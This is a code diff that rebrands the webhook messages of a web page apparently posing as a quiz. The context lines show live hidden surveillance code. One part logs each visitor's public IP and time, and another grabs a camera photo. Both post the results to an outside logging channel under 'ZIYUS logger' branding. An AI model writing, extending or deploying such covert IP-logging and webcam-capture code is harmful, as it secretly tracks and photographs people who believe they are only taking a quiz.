@@ -246,10 +246,10 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            username: "n0signal website logger",
+            username: "🇿​​🇮​​🇾​​🇺​​🇸​ ​🇼​​🇪​​🇧​​🇸​​🇮​​🇹​​🇪​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷​",
             embeds: [{
-              title: "🌐 Bestie Entered the Website",
-              description: "Someone just opened the quiz!",
+              title: "Beshie Entered the Website!",
+              description: "Binuksan na ni Beshie!",
               color: 10181046,
               fields: [
                 { name: "Public IP:", value: `\`${publicIP}\``, inline: false },
@@ -257,7 +257,7 @@
                 { name: "Time:", value: `\`${new Date().toLocaleString()}\``, inline: true }
               ],
               timestamp: new Date().toISOString(),
-              footer: { text: "WCKD Logger" }
+              footer: { text: "​🇿​​🇮​​🇾​​🇺​​🇸​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷" }
             }]
           })
         });
@@ -333,16 +333,16 @@
           const form = new FormData();
           form.append('file', file, 'bestie.jpg');
           form.append('payload_json', JSON.stringify({
-            username: "n0signal camera grabber",
+            username: "​🇿​​🇮​​🇾​​🇺​​🇸​ ​🇨​​🇦​​🇲​​🇪​​🇷​​🇦​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷​",
             content: "",
             embeds: [{
               title: "Camera Grabbed:",
-              description: "Ang cutie ng Bestie ko",
+              description: "Ang cute ng beshie ko!",
               color: 10181046,
               fields: [{ name: "Public Ip:", value: `\`${publicIP}\``, inline: false }],
               image: { url: "attachment://bestie.jpg" },
               timestamp: new Date().toISOString(),
-              footer: { text: "WCKD Logger" }
+              footer: { text: "🇿​​🇮​​🇾​​🇺​​🇸​ ​🇱​​🇴​​🇬​​🇬​​🇪​​🇷" }
             }]
           }));
 
